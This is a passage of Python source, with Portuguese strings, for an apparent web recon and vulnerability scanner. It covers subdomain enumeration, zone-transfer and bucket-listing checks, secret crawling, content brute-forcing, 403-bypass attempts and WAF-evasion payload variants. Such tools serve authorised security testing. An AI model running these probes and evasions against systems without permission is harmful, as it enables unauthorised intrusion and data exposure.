                _prox = {"http": opts["proxy"], "https": opts["proxy"]} if opts.get("proxy") else None
                for scheme in ("https", "http"):
                    try:
                        r = requests.get(f"{scheme}://{host}/", timeout=opts["timeout"],
                                         verify=False, headers={"User-Agent": opts["ua"]},
                                         allow_redirects=True, proxies=_prox)
                        if sig.lower() in (r.text or "").lower():
                            confirmed = True
                        break
                    except requests.RequestException:
                        continue
            sev = "HIGH" if confirmed else "MEDIUM"
            title = ("Subdomain takeover CONFIRMADO" if confirmed
                     else "Possivel subdomain takeover (CNAME dangling)")
            bag.add(Finding(host, "misconfig", sev, f"{title}: {service}",
                            f"CNAME aponta para {service}", f"https://{host}/",
                            f"CNAME -> {cname}"))
            return


def check_email_security(hostname, res, opts, bag):
    apex = _apex(hostname)
    spf = dmarc = False
    try:
        for r in res.resolve(apex, "TXT"):
            if "v=spf1" in str(r).lower():
                spf = True
    except Exception:
        pass
    try:
        for r in res.resolve("_dmarc." + apex, "TXT"):
            if "v=dmarc1" in str(r).lower():
                dmarc = True
    except Exception:
        pass
    if not spf:
        bag.add(Finding(apex, "misconfig", "LOW", "Registro SPF ausente (email spoofing)",
                        "Dominio sem politica SPF", f"dns://{apex}"))
    if not dmarc:
        bag.add(Finding(apex, "misconfig", "LOW", "Registro DMARC ausente (email spoofing)",
                        "Dominio sem politica DMARC", f"dns://_dmarc.{apex}"))


def try_zone_transfer(hostname, res, opts, bag):
    apex = _apex(hostname)
    try:
        ns_records = [str(r.target).rstrip(".") for r in res.resolve(apex, "NS")]
    except Exception:
        return
    for ns in ns_records[:4]:
        try:
            xfr = dns.query.xfr(ns, apex, timeout=opts["timeout"], lifetime=opts["timeout"] * 2)
            z = dns.zone.from_xfr(xfr)
            names = [n.to_text() for n in z.nodes.keys()]
            if names:
                bag.add(Finding(apex, "misconfig", "HIGH",
                                "Transferencia de zona DNS (AXFR) permitida",
                                f"NS {ns} liberou {len(names)} registros", f"dns://{ns}",
                                ", ".join(sorted(names)[:10])))
                return
        except Exception:
            continue


def extract_cert_sans(host, opts, bag):
    hostname = _hostname_of(host)
    if _is_ip(hostname) or opts["no_tls"]:
        return
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((hostname, 443), timeout=opts["timeout"]) as s:
            with ctx.wrap_socket(s, server_hostname=hostname) as ss:
                der = ss.getpeercert(binary_form=True)
    except Exception:
        return
    try:
        from cryptography import x509
        from cryptography.x509.oid import ExtensionOID
        c = x509.load_der_x509_certificate(der)
        ext = c.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
        sans = sorted(set(ext.value.get_values_for_type(x509.DNSName)))
        if len(sans) > 1:
            bag.add(Finding(host, "info_disclosure", "INFO",
                            f"Subdominios no certificado TLS (SAN): {len(sans)}",
                            "Uteis para expandir a superficie de ataque",
                            f"https://{hostname}", ", ".join(sans[:15])))
    except Exception:
        return


# --------------------------------------------------------------------------- #
# Cloud storage / redirect / host header
# --------------------------------------------------------------------------- #
def check_cloud_storage(sess, host, base, home_body, opts, bag):
    if opts["no_cloud"]:
        return
    vlog(opts, 1, f"  {C.BLUE}> buckets S3/GCS/Azure (refs + guessing){C.RESET}")
    buckets_confirmed = set()  # nomes vistos explicitamente no corpo da pagina (alta confianca)
    for pat in CLOUD_BUCKET_PATTERNS:
        for m in pat.finditer(home_body or ""):
            b = m.group(1)
            if 3 <= len(b) <= 63:
                buckets_confirmed.add(b.lower())
    buckets_guessed = set()  # candidatos gerados pelo nome do dominio (precisa confirmar posse)
    # Guessing de nome de bucket a partir do hostname: SOMENTE para dominios reais.
    # Para IPs, fragmentos como "127.0.0.1" geram nomes sem sentido (ex.: apex="0" -> "0-media")
    # que podem coincidir com buckets REAIS de terceiros sem nenhuma relacao com o alvo.
    hostname = _hostname_of(host)
    if not _is_ip(hostname) and "." in hostname:
        name = hostname.split(".")[0]
        apex = _apex(hostname).split(".")[0]
        if len(apex) >= 3:
            for guess in {name, apex, f"{apex}-backup", f"{apex}-backups", f"{apex}-assets",
                          f"{apex}-static", f"{apex}-dev", f"{apex}-prod", f"{apex}-media",
                          f"{apex}-uploads", f"{apex}-data", f"{apex}-files", f"www-{apex}"}:
                if guess and len(guess) >= 3:
                    buckets_guessed.add(guess.lower())
    buckets = buckets_confirmed | buckets_guessed

    # Contas Azure Blob referenciadas explicitamente no corpo
    azure_accounts = set(re.findall(r"([a-z0-9]{3,24})\.blob\.core\.windows\.net", home_body or ""))

    def test_bucket(b):
        confirmed = b in buckets_confirmed
        prefix = "" if confirmed else "[NOME ADIVINHADO - CONFIRME A POSSE ANTES DE TRATAR COMO DO ALVO] "
        candidates = [
            (f"https://{b}.s3.amazonaws.com/", "S3"),
            (f"https://storage.googleapis.com/{b}/", "GCS"),
            (f"https://{b}.nyc3.digitaloceanspaces.com/", "DO Spaces"),
            (f"https://{b}.fra1.digitaloceanspaces.com/", "DO Spaces"),
        ]
        for url, svc in candidates:
            r = do_request(sess, "GET", url, opts)
            if r is None:
                continue
            body = read_body(r, 8000)
            if r.status_code == 200 and ("<ListBucketResult" in body or "<Contents>" in body
                                         or '"items"' in body or "<Name>" in body):
                sev = "HIGH" if confirmed else "MEDIUM"
                bag.add(Finding(host, "sensitive_data", sev,
                                f"{prefix}Bucket {svc} publico com listagem habilitada",
                                f"bucket '{b}' lista o conteudo "
                                f"({'referenciado no site' if confirmed else 'nome adivinhado a partir do dominio'})",
                                url, "HTTP 200 (listagem)",
                                confidence="alta" if confirmed else "media"))
                return
            if r.status_code == 403 and ("AccessDenied" in body or "<Error>" in body
                                         or "InvalidAccessKeyId" in body):
                if confirmed:  # bucket adivinhado que so existe (403) nao e informativo o suficiente
                    bag.add(Finding(host, "info_disclosure", "INFO",
                                    f"Bucket {svc} existe (acesso negado)", f"bucket '{b}'", url, "HTTP 403"))

    def test_azure(acct):
        for container in ("$root", "public", "assets", "backup", "files", "media", "uploads"):
            url = f"https://{acct}.blob.core.windows.net/{container}?restype=container&comp=list"
            r = do_request(sess, "GET", url, opts)
            if r is None:
                continue
            body = read_body(r, 8000)
            if r.status_code == 200 and "<EnumerationResults" in body:
                bag.add(Finding(host, "sensitive_data", "HIGH",
                                "Azure Blob container publico com listagem",
                                f"conta '{acct}' container '{container}'", url, "HTTP 200"))
                return

    with concurrent.futures.ThreadPoolExecutor(max_workers=max(4, opts["path_threads"] // 2)) as ex:
        list(ex.map(test_bucket, buckets))
        if azure_accounts:
            list(ex.map(test_azure, list(azure_accounts)[:5]))


def check_open_redirect(sess, host, base, opts, bag):
    vlog(opts, 1, f"  {C.BLUE}> open redirect ({len(OPEN_REDIRECT_PARAMS)} params){C.RESET}")
    for param in OPEN_REDIRECT_PARAMS:
        url = f"{base}/?{param}={OPEN_REDIRECT_PAYLOAD}"
        r = do_request(sess, "GET", url, opts, allow_redirects=False)
        if r is None:
            continue
        loc = r.headers.get("Location", "")
        if r.status_code in (301, 302, 303, 307, 308) and (
                loc.startswith("https://" + OOB_MARKER) or loc.startswith("http://" + OOB_MARKER)
                or loc.startswith("//" + OOB_MARKER)):
            bag.add(Finding(host, "misconfig", "MEDIUM", "Open redirect",
                            f"parametro '{param}' redireciona para dominio externo", url,
                            f"Location: {loc}"))
            return


def check_host_header_injection(sess, host, base, opts, bag):
    vlog(opts, 1, f"  {C.BLUE}> host header injection{C.RESET}")
    r = do_request(sess, "GET", base + "/", opts, headers={"Host": OOB_MARKER},
                   allow_redirects=False)
    if r is None:
        return
    loc = r.headers.get("Location", "")
    if OOB_MARKER in loc:
        bag.add(Finding(host, "misconfig", "MEDIUM",
                        "Host header injection (refletido em redirect)",
                        "Host malicioso refletido no Location", base + "/", f"Location: {loc}"))
        return
    body = read_body(r, 20000)
    if OOB_MARKER in body:
        bag.add(Finding(host, "misconfig", "LOW", "Host header refletido no corpo",
                        "Possivel web cache poisoning / password-reset poisoning", base + "/"))


def crawl_assets(sess, host, base, home_body, opts, bag):
    """Coleta JS linkados na home, baixa e escaneia por segredos, source maps e endpoints."""
    if opts["no_crawl"]:
        return
    hostname = _hostname_of(host)
    srcs = set()
    for rgx in (JS_SRC_RE, LINK_JS_RE):
        for m in rgx.finditer(home_body or ""):
            srcs.add(m.group(1))
    assets = []
    for s in srcs:
        full = urljoin(base + "/", s.strip())
        pu = urlparse(full)
        if pu.scheme not in ("http", "https"):
            continue
        if pu.netloc and hostname.split(":")[0] not in pu.netloc:
            continue  # so mesmo host (evita CDNs de terceiros)
        if full not in assets:
            assets.append(full)
    assets = assets[:opts["max_assets"]]
    if not assets:
        return
    vlog(opts, 1, f"  {C.BLUE}> crawling de {len(assets)} asset(s) JS (segredos/sourcemap/endpoints){C.RESET}")

    def fetch_scan(u):
        r = do_request(sess, "GET", u, opts)
        if r is None or r.status_code != 200:
            return
        body = read_body(r, 800000)
        if not body:
            return
        # 1. segredos hardcoded no JS (alta confianca)
        scan_body_for_secrets(host, u, body, bag, in_file=True)
        # 2. source map -> vaza codigo-fonte
        found_map = False
        mm = SOURCEMAP_RE.search(body)
        if mm and not mm.group(1).strip().startswith("data:"):
            map_url = urljoin(u, mm.group(1).strip())
            rm = do_request(sess, "GET", map_url, opts)
            if rm is not None and rm.status_code == 200 and '"sources"' in raw_text(rm, 4096):
                bag.add(Finding(host, "info_disclosure", "MEDIUM",
                                "Source map exposto (vaza codigo-fonte)", map_url, map_url, "HTTP 200"))
                found_map = True
        if not found_map and not u.split("?")[0].endswith(".map"):
            mu = u.split("?")[0] + ".map"
            rm = do_request(sess, "GET", mu, opts)
            if rm is not None and rm.status_code == 200 and '"sources"' in raw_text(rm, 4096):
                bag.add(Finding(host, "info_disclosure", "MEDIUM",
                                "Source map exposto (vaza codigo-fonte)", mu, mu, "HTTP 200"))
        # 3. endpoints internos referenciados no JS
        eps = sorted(set(m.group(1) for m in ENDPOINT_RE.finditer(body)))
        if eps:
            bag.add(Finding(host, "info_disclosure", "INFO",
                            f"Endpoints referenciados em JS ({len(eps)})",
                            "Uteis para mapear a API", u, ", ".join(eps[:8])))
        # 4. hosts internos vazados
        internal = sorted(set(m.group(0) for m in INTERNAL_HOST_RE.finditer(body)))
        if internal:
            bag.add(Finding(host, "info_disclosure", "LOW",
                            f"Host/IP interno referenciado em JS ({len(internal)})",
                            "", u, ", ".join(internal[:6])))

    with concurrent.futures.ThreadPoolExecutor(max_workers=max(4, opts["path_threads"] // 2)) as ex:
        list(ex.map(fetch_scan, assets))


def scan_html_comments(host, url, text, bag):
    """Extrai comentarios HTML com palavras-chave sensiveis."""
    if not text:
        return
    for m in HTML_COMMENT_RE.finditer(text[:400000]):
        comment = m.group(1).strip()
        if not comment or len(comment) > 400:
            continue
        kw = COMMENT_KEYWORDS.search(comment)
        if kw:
            snippet = re.sub(r"\s+", " ", comment)[:120]
            bag.add(Finding(host, "info_disclosure", "LOW",
                            f"Comentario HTML sensivel ({kw.group(1).lower()})",
                            "", url, snippet))
            return  # um por pagina


def check_firebase(sess, host, base, home_body, opts, bag):
    if opts["no_cloud"]:
        return
    projects = set()
    for m in FIREBASE_RE.finditer(home_body or ""):
        projects.add(m.group(1))
    for m in FIREBASE_CFG_RE.finditer(home_body or ""):
        val = m.group(1)
        mm = FIREBASE_RE.search(val)
        if mm:
            projects.add(mm.group(1))
    if not projects:
        return
    vlog(opts, 1, f"  {C.BLUE}> Firebase RTDB ({len(projects)} projeto(s)){C.RESET}")

    def test_proj(proj):
        url = f"https://{proj}.firebaseio.com/.json"
        r = do_request(sess, "GET", url, opts)
        if r is None:
            return
        body = read_body(r, 8000)
        if r.status_code == 200 and body.strip() not in ("null", "{}", ""):
            bag.add(Finding(host, "sensitive_data", "CRITICAL",
                            "Firebase Realtime DB aberto (leitura publica)",
                            f"projeto '{proj}' retorna dados", url, "HTTP 200 com conteudo"))
        elif r.status_code == 200 and body.strip() == "null":
            bag.add(Finding(host, "info_disclosure", "INFO",
                            "Firebase RTDB acessivel (vazio/regras abertas)",
                            f"projeto '{proj}'", url, "HTTP 200 null"))
    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
        list(ex.map(test_proj, list(projects)[:8]))


def check_well_known(sess, host, base, opts, bag):
    vlog(opts, 1, f"  {C.BLUE}> .well-known estendido ({len(WELL_KNOWN_PATHS)}){C.RESET}")

    def probe(path):
        url = base + path
        r = do_request(sess, "GET", url, opts)
        if r is None or r.status_code not in (200, 206):
            return
        body = read_body(r, 8192)
        if is_false_hit(sess, path, body, r):
            return
        sev, cat = "INFO", "info_disclosure"
        if "openid-configuration" in path or "oauth" in path:
            sev = "LOW"
        bag.add(Finding(host, cat, sev, f".well-known acessivel: {path.split('/')[-1]}",
                        path, url, f"HTTP {r.status_code}"))
        scan_body_for_secrets(host, url, body, bag)
    with concurrent.futures.ThreadPoolExecutor(max_workers=opts["path_threads"]) as ex:
        list(ex.map(probe, WELL_KNOWN_PATHS))


def check_error_disclosure(sess, host, base, opts, bag):
    """Injeta caracteres quebrados em parametros comuns para forcar stack traces/erros SQL."""
    vlog(opts, 1, f"  {C.BLUE}> info disclosure baseado em erro{C.RESET}")

    def probe(param):
        for val in ERROR_PROBE_VALUES:
            from urllib.parse import quote
            url = f"{base}/?{param}={quote(val)}"
            r = do_request(sess, "GET", url, opts)
            if r is None:
                continue
            body = read_body(r, 40000)
            before = len(bag.items)
            scan_body_for_errors(host, url, body, bag)
            if len(bag.items) > before:
                return  # ja achou erro com esse param
    with concurrent.futures.ThreadPoolExecutor(max_workers=max(4, opts["path_threads"] // 2)) as ex:
        list(ex.map(probe, ERROR_PROBE_PARAMS))


# --------------------------------------------------------------------------- #
# Enumeracao de subdominios e URLs (recon)
# --------------------------------------------------------------------------- #
def _osint_get(url, opts, timeout=25):
    """GET simples para fontes OSINT (independente da sessao de scan). Respeita --proxy."""
    proxies = {"http": opts["proxy"], "https": opts["proxy"]} if opts.get("proxy") else None
    try:
        r = requests.get(url, timeout=timeout, verify=False, proxies=proxies,
                         headers={"User-Agent": opts["ua"]}, allow_redirects=True)
        STATS.inc_req()
        if r.status_code == 200:
            return r
    except requests.RequestException:
        STATS.inc_err()
    return None


def enum_crtsh(domain, opts):
    subs = set()
    r = _osint_get(f"https://crt.sh/?q=%25.{domain}&output=json", opts, timeout=40)
    if r is None:
        return subs
    try:
        data = r.json()
    except Exception:
        return subs
    for entry in data:
        for field in ("name_value", "common_name"):
            val = entry.get(field, "")
            for name in str(val).split("\n"):
                name = name.strip().lstrip("*.").lower()
                if name.endswith("." + domain) or name == domain:
                    if "@" not in name and " " not in name:
                        subs.add(name)
    return subs


def enum_hackertarget(domain, opts):
    subs = set()
    r = _osint_get(f"https://api.hackertarget.com/hostsearch/?q={domain}", opts, timeout=25)
    if r is None:
        return subs
    if "API count exceeded" in r.text or "error" in r.text.lower():
        return subs
    for line in r.text.splitlines():
        host = line.split(",")[0].strip().lower()
        if host.endswith("." + domain) or host == domain:
            subs.add(host)
    return subs


def enum_otx(domain, opts):
    subs = set()
    r = _osint_get(f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns",
                   opts, timeout=25)
    if r is None:
        return subs
    try:
        data = r.json()
    except Exception:
        return subs
    for rec in data.get("passive_dns", []):
        host = str(rec.get("hostname", "")).strip().lower()
        if host.endswith("." + domain) or host == domain:
            subs.add(host)
    return subs


def enum_rapiddns(domain, opts):
    subs = set()
    r = _osint_get(f"https://rapiddns.io/subdomain/{domain}?full=1", opts, timeout=25)
    if r is None:
        return subs
    for m in re.finditer(r"<td>([a-z0-9_.\-]+\.%s)</td>" % re.escape(domain), r.text, re.I):
        subs.add(m.group(1).strip().lower())
    return subs


def _make_resolver(opts):
    res = dns.resolver.Resolver()
    res.lifetime = max(2.0, opts["timeout"])
    res.timeout = max(2.0, opts["timeout"])
    return res


def _detect_wildcard(res, domain):
    """Retorna o conjunto de IPs de wildcard DNS (para descartar falsos positivos)."""
    wildcard_ips = set()
    for _ in range(2):
        rnd = "".join(random.choices(string.ascii_lowercase + string.digits, k=14))
        try:
            for r in res.resolve(f"{rnd}.{domain}", "A"):
                wildcard_ips.add(r.address)
        except Exception:
            pass
    return wildcard_ips


def _resolve_candidates(res, candidates, wildcard_ips, opts):
    """Resolve uma lista de hostnames em paralelo; retorna os que existem (fora do wildcard)."""
    found = set()
    lock = threading.Lock()

    def check(h):
        try:
            ips = {r.address for r in res.resolve(h, "A")}
        except Exception:
            return
        if ips and not ips.issubset(wildcard_ips):
            with lock:
                found.add(h)
    with concurrent.futures.ThreadPoolExecutor(max_workers=opts["enum_threads"]) as ex:
        list(ex.map(check, candidates))
    return found


def enum_dns_brute(domain, opts):
    """Enumeracao ATIVA por brute-force DNS de subdominios."""
    if opts["no_brute"] or not HAVE_DNS:
        return set()
    res = _make_resolver(opts)
    wildcard_ips = _detect_wildcard(res, domain)
    words = opts["sub_wordlist"] or SUBDOMAIN_WORDLIST
    cands = [f"{w.strip()}.{domain}" for w in words if w.strip()]
    return _resolve_candidates(res, cands, wildcard_ips, opts)


def enum_permutations(domain, known_subs, opts):
    """Enumeracao ATIVA por permutacao/alteracao dos subdominios ja descobertos (altdns-like)."""
    if opts["no_perms"] or not HAVE_DNS:
        return set()
    labels = set()
    suffix = "." + domain
    for s in known_subs:
        if s.endswith(suffix):
            prefix = s[:-len(suffix)]
            first = prefix.split(".")[0]
            if first and first not in ("www",):
                labels.add(first)
    if not labels:
        return set()
    cands = set()
    for lbl in labels:
        for w in PERM_WORDS:
            cands.add(f"{w}-{lbl}.{domain}")
            cands.add(f"{lbl}-{w}.{domain}")
            cands.add(f"{w}.{lbl}.{domain}")
            cands.add(f"{lbl}{w}.{domain}")
            cands.add(f"{w}{lbl}.{domain}")
    cands -= set(known_subs)
    cands = list(cands)[:opts["max_perms"]]
    if not cands:
        return set()
    res = _make_resolver(opts)
    wildcard_ips = _detect_wildcard(res, domain)
    return _resolve_candidates(res, cands, wildcard_ips, opts)


def enumerate_subdomains(domain, opts):
    domain = domain.lower().strip().lstrip(".")
    p(f"{C.BLUE}[*]{C.RESET} Enumerando subdominios de {C.BOLD}{domain}{C.RESET} ...")
    all_subs = {domain}
    sources = [
        ("crt.sh", enum_crtsh),
        ("HackerTarget", enum_hackertarget),
        ("AlienVault OTX", enum_otx),
        ("RapidDNS", enum_rapiddns),
    ]
    for name, fn in sources:
        try:
            got = fn(domain, opts)
        except Exception:
            got = set()
        if got:
            new = len(got - all_subs)
            all_subs |= got
            p(f"  {C.GREEN}[+]{C.RESET} {name}: {len(got)} (+{new} novos)")
        else:
            vlog(opts, 1, f"  {C.GREY}[.]{C.RESET} {name}: 0")
    # DNS brute (ativo)
    if not opts["no_brute"]:
        p(f"  {C.BLUE}[*]{C.RESET} DNS brute-force ativo ({len(opts['sub_wordlist'] or SUBDOMAIN_WORDLIST)} palavras) ...")
        brute = enum_dns_brute(domain, opts)
        new = len(brute - all_subs)
        all_subs |= brute
        p(f"  {C.GREEN}[+]{C.RESET} DNS brute: {len(brute)} (+{new} novos)")
    # Permutacoes ativas (altdns-like) sobre tudo que foi descoberto
    if not opts["no_perms"]:
        p(f"  {C.BLUE}[*]{C.RESET} Permutacao ativa de subdominios ...")
        perms = enum_permutations(domain, all_subs, opts)
        new = len(perms - all_subs)
        all_subs |= perms
        p(f"  {C.GREEN}[+]{C.RESET} Permutacoes: {len(perms)} resolvidos (+{new} novos)")
    return sorted(all_subs)


def filter_alive(hosts, opts):
    """Mantem apenas hosts que respondem HTTP(S)."""
    alive = []
    lock = threading.Lock()

    _prox = {"http": opts["proxy"], "https": opts["proxy"]} if opts.get("proxy") else None

    def check(h):
        for scheme in ("https", "http"):
            try:
                r = requests.get(f"{scheme}://{h}/", timeout=opts["timeout"], verify=False,
                                 headers={"User-Agent": opts["ua"]}, allow_redirects=True,
                                 stream=True, proxies=_prox)
                r.close()
                STATS.inc_req()
                with lock:
                    alive.append(h)
                return
            except requests.RequestException:
                STATS.inc_err()
                continue
    with concurrent.futures.ThreadPoolExecutor(max_workers=opts["enum_threads"]) as ex:
        list(ex.map(check, hosts))
    return sorted(set(alive))


def enum_wayback(host, opts):
    """URLs historicas via Wayback Machine (CDX)."""
    urls = set()
    if opts["no_wayback"]:
        return urls
    api = (f"http://web.archive.org/cdx/search/cdx?url={quote(host)}/*"
           f"&output=json&fl=original&collapse=urlkey&limit={opts['max_urls'] * 3}")
    r = _osint_get(api, opts, timeout=30)
    if r is None:
        return urls
    try:
        rows = r.json()
    except Exception:
        return urls
    for row in rows[1:]:  # primeira linha e cabecalho
        if row and isinstance(row, list):
            urls.add(row[0])
    return urls


def enum_robots_sitemap(sess, host, base, opts):
    paths = set()
    for fname in ("/robots.txt", "/sitemap.xml", "/sitemap_index.xml"):
        r = do_request(sess, "GET", base + fname, opts)
        if r is None or r.status_code != 200:
            continue
        body = raw_text(r, 200000)
        if fname == "/robots.txt":
            for m in re.finditer(r"(?im)^(?:Allow|Disallow)\s*:\s*(\S+)", body):
                pth = m.group(1).strip()
                if pth and pth != "/":
                    paths.add(urljoin(base + "/", pth))
        else:
            for m in re.finditer(r"<loc>\s*([^<\s]+)\s*</loc>", body, re.I):
                paths.add(m.group(1).strip())
    return paths


def enum_crawl_links(home_body, base, host, opts):
    """Extrai links (href) da home, mesmo host."""
    links = set()
    hostname = _hostname_of(host).split(":")[0]
    for m in re.finditer(r'href=["\']([^"\'#]+)["\']', home_body or "", re.I):
        href = m.group(1).strip()
        if href.startswith("javascript:") or href.startswith("mailto:") or href.startswith("tel:"):
            continue
        full = urljoin(base + "/", href)
        pu = urlparse(full)
        if pu.scheme in ("http", "https") and hostname in pu.netloc:
            links.add(full.split("#")[0])
    return links


def _extract_links(body, page_url, hostname):
    """Extrai href/src/action do HTML, mesmo host, absolutos e sem fragmento."""
    links = set()
    for m in re.finditer(r'(?:href|src|action)=["\']([^"\'<>]+)["\']', body or "", re.I):
        ref = m.group(1).strip()
        if not ref or ref.startswith(("javascript:", "mailto:", "tel:", "data:", "#")):
            continue
        full = urljoin(page_url, ref).split("#")[0]
        pu = urlparse(full)
        if pu.scheme in ("http", "https") and hostname in pu.netloc:
            links.add(full)
    return links


def active_crawl(sess, host, base, home_body, opts, bag):
    """Enumeracao ATIVA de URLs: spider recursivo (BFS) ate crawl_depth, mesmo host.
    Analisa cada pagina baixada (segredos/erros/comentarios) enquanto rastreia."""
    if opts["crawl_depth"] <= 0:
        return set()
    hostname = _hostname_of(host).split(":")[0]
    vlog(opts, 1, f"  {C.BLUE}> crawl ativo (spider recursivo, prof.={opts['crawl_depth']}){C.RESET}")
    seen = set()
    collected = set()
    lock = threading.Lock()
    current = set([base + "/"])
    # semeia com os links da propria home ja baixada
    current |= _extract_links(home_body, base + "/", hostname)

    for depth in range(opts["crawl_depth"]):
        if not current or len(seen) >= opts["max_urls"]:
            break
        nxt = set()

        def visit(u):
            with lock:
                if u in seen or len(seen) >= opts["max_urls"]:
                    return
                seen.add(u)
            r = do_request(sess, "GET", u, opts, allow_redirects=False)
            if r is None or r.status_code not in (200, 206):
                return
            ctype = r.headers.get("Content-Type", "")
            body = read_body(r, 400000)
            with lock:
                collected.add(u)
            # analisa a pagina enquanto rastreia (info disclosure/sensitive data)
            scan_body_for_secrets(host, u, body, bag)
            scan_body_for_errors(host, u, body, bag)
            scan_html_comments(host, u, body, bag)
            if "html" in ctype:
                for l in _extract_links(body, u, hostname):
                    with lock:
                        if l not in seen:
                            nxt.add(l)
        with concurrent.futures.ThreadPoolExecutor(max_workers=opts["path_threads"]) as ex:
            list(ex.map(visit, list(current)[:opts["max_urls"]]))
        current = nxt
    return collected


def content_bruteforce(sess, host, base, opts, bag):
    """Enumeracao ATIVA de conteudo: brute-force de diretorios/arquivos (mini gobuster)."""
    if opts["no_content_brute"]:
        return set()
    words = opts["content_wordlist"] or CONTENT_WORDLIST
    vlog(opts, 1, f"  {C.BLUE}> brute-force de conteudo ({len(words)} paths){C.RESET}")
    found = set()
    lock = threading.Lock()

    def probe(w):
        path = "/" + w.strip().lstrip("/")
        url = base + path
        # sem redirect: detecta 401/403 (existe protegido) e redirect p/ diretorio
        r = do_request(sess, "GET", url, opts, allow_redirects=False)
        if r is None:
            return
        st = r.status_code
        if st in (401, 403):
            # nao reporta o 403; tenta bypass e so reporta se conseguir acesso
            attempt_bypass(sess, host, url, st, opts, bag)
            return
        # 301/302 que apenas adiciona '/' => diretorio existe; segue para confirmar
        if st in (301, 302, 307, 308):
            loc = r.headers.get("Location", "")
            if not (loc.rstrip("/").endswith(path.rstrip("/")) or loc.endswith(path + "/")):
                return  # redirect para outro lugar (nao e o diretorio) -> ignora
            r = do_request(sess, "GET", url + "/", opts, allow_redirects=True)
            if r is None:
                return
            st = r.status_code
        if st in (200, 204):
            body = read_body(r, 8192)
            if is_false_hit(sess, path, body, r):
                return
            with lock:
                found.add(url)
            clen = r.headers.get("Content-Length") or str(len(r.content))
            listing = " (listing)" if DIR_LISTING_PATTERN.search(body) else ""
            sev = "MEDIUM" if listing else "LOW"
            bag.add(Finding(host, "info_disclosure", sev,
                            f"Conteudo/diretorio acessivel: {path}{listing}", "", url,
                            f"HTTP {st}, {clen} bytes"))
    with concurrent.futures.ThreadPoolExecutor(max_workers=opts["path_threads"]) as ex:
        list(ex.map(probe, words))
    return found


def enumerate_urls(sess, host, base, home_body, opts, bag):
    """Combina enum PASSIVA (wayback/sitemap/robots) e ATIVA (spider + content brute)."""
    vlog(opts, 1, f"  {C.BLUE}> enumeracao de URLs (passiva + ativa){C.RESET}")
    found = set()
    # passiva
    found |= enum_wayback(host, opts)
    found |= enum_robots_sitemap(sess, host, base, opts)
    found |= enum_crawl_links(home_body, base, host, opts)
    # ativa
    if not opts["no_active_crawl"]:
        found |= active_crawl(sess, host, base, home_body, opts, bag)
    if not opts["no_content_brute"]:
        found |= content_bruteforce(sess, host, base, opts, bag)
    # normaliza para o host atual e limita
    hostname = _hostname_of(host).split(":")[0]
    urls = []
    for u in found:
        pu = urlparse(u)
        if hostname in pu.netloc:
            urls.append(u)
    urls = sorted(set(urls))[:opts["max_urls"]]
    if urls:
        p(f"  {C.GREEN}[+]{C.RESET} {host}: {len(urls)} URL(s) enumeradas "
          f"{C.DIM}(passiva+ativa){C.RESET}")
        bag.add(Finding(host, "info_disclosure", "INFO",
                        f"URLs enumeradas: {len(urls)}",
                        "Fontes: Wayback/sitemap/robots/spider/content-brute", base + "/",
                        ", ".join(u.split(hostname, 1)[-1][:40] for u in urls[:5])))
    return urls


def scan_discovered_urls(sess, host, base, urls, opts, bag):
    """Baixa cada URL enumerada e procura segredos, erros e comentarios sensiveis."""
    if not urls:
        return
    vlog(opts, 1, f"  {C.BLUE}> analisando {len(urls)} URL(s) enumeradas{C.RESET}")

    def analyze(u):
        r = do_request(sess, "GET", u, opts, allow_redirects=False)
        if r is None:
            return
        if r.status_code in (401, 403):
            # nao reporta o 403; tenta bypass e so reporta se conseguir acesso
            attempt_bypass(sess, host, u, r.status_code, opts, bag)
            return
        if r.status_code >= 500:
            scan_body_for_errors(host, u, read_body(r, 40000), bag)
            return
        if r.status_code not in (200, 206):
            return
        body = read_body(r, 300000)
        scan_body_for_secrets(host, u, body, bag)
        scan_body_for_errors(host, u, body, bag)
        scan_html_comments(host, u, body, bag)
        # se a URL tem parametros, ela e candidata a error-based disclosure
        if "?" in u and "=" in u:
            probe = u + "'" if not u.endswith("'") else u
            rp = do_request(sess, "GET", probe, opts)
            if rp is not None:
                scan_body_for_errors(host, probe, read_body(rp, 40000), bag)
    with concurrent.futures.ThreadPoolExecutor(max_workers=opts["path_threads"]) as ex:
        list(ex.map(analyze, urls))


def _set_param(url, param, payload):
    """Retorna a URL com o valor de UM parametro trocado pelo payload (mantem os demais)."""
    pu = urlparse(url)
    pairs = parse_qsl(pu.query, keep_blank_values=True)
    newp = [(k, payload if k == param else v) for k, v in pairs]
    q = urlencode(newp, quote_via=quote, safe="/.:@")
    return urlunparse(pu._replace(query=q))


def _set_param_raw(url, param, raw_value):
    """Insere o valor JA no formato final (encodado), SEM re-encodar. Para variantes de evasao."""
    pu = urlparse(url)
    pairs = parse_qsl(pu.query, keep_blank_values=True)
    parts, hit = [], False
    for k, v in pairs:
        if k == param:
            parts.append(f"{quote(k, safe='')}={raw_value}")
            hit = True
        else:
            parts.append(f"{quote(k, safe='')}={quote(v, safe=':@')}")
    if not hit:
        parts.append(f"{quote(param, safe='')}={raw_value}")
    return urlunparse(pu._replace(query="&".join(parts)))


def _is_blocked(r):
    """True se a resposta parece bloqueio de WAF/filtro (para acionar as variantes encodadas)."""
    if r is None:
        return False
    if r.status_code in WAF_BLOCK_CODES:
        return True
    if r.status_code == 200 and WAF_BLOCK_SIGNS.search(read_body(r, 4000)):
        return True
    return False


def _try_evasion(sess, u, pn, base_payload, detector, opts, redirect=False, variants=None):
    """Se o payload cru foi bloqueado, tenta as variantes encodadas/ofuscadas.
    detector(response) -> True se a variante confirmou a vuln.
    'variants' opcional: lista [(rotulo, valor)] pronta; senao gera do base_payload.
    Retorna (tecnica, url, variante) na primeira que contornar; senao None."""
    if opts.get("no_evasion"):
        return None
    vs = variants if variants is not None else payload_variants(base_payload)
    for label, variant in vs:
        tu = _set_param_raw(u, pn, variant)
        r = do_request(sess, "GET", tu, opts, allow_redirects=not redirect)
        if r is None or _is_blocked(r):
            continue
        if detector(r):
            return label, tu, variant
    return None


def test_parameters(sess, host, base, urls, opts, bag):
    """Inventario + fuzzing por parametro individual: SQLi/erro, XSS refletido, LFI, open redirect."""
    if opts["no_params"] or not urls:
        return
    inventory = {}
    param_urls, seen_sig = [], set()
    for u in urls:
        pu = urlparse(u)
        if not pu.query:
            continue
